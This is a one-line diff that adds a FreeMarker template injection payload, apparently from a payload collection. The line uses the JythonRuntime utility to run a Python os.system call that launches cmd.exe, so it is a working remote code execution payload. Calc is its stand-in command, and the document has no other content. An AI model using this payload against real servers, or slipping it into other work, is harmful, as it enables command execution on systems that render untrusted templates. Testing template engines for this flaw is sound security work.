@@ -1,0 +1,1 @@
+<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("cmd.exe /c calc")</@value>
